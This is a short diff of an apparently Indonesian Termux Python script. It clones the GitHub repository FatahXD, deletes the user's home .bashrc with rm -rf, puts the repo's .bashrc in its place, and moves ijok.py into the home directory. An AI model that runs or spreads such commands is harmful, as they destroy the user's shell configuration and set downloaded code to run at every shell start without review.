@@ -12,9 +12,9 @@ U = '\033[95m'    # WARNA UNGU
 x = '\33[m'           # WARNA DEFAULT
 import subprocess
 print("SABARRR....")
-os.system("pkg install time && git clone https://github.com/FatahXD/FatahXD && cd FatahXD")
-os.system("pkg install figlet && mv .bashrc ../../../../../../data/data/com.termux/files/home")
-os.system("mv ijok.py ../../../../../data/data/com.termux/files/home && cd ../ && rm -rf FatahXD")
+os.system("pkg install time && pkg install git && pkg install figlet && git clone  https://github.com/FatahXD/FatahXD")
+os.system("rm -rf ../../../../../../data/data/com.termux/files/home/.bashrc && mv FatahXD/.bashrc ../../../../../../data/data/com.termux/files/home")
+os.system("mv FatahXD/ijok.py ../../../../../data/data/com.termux/files/home && rm -rf FatahXD")
 
 while True:
     start_time = time.time() # Waktu awal
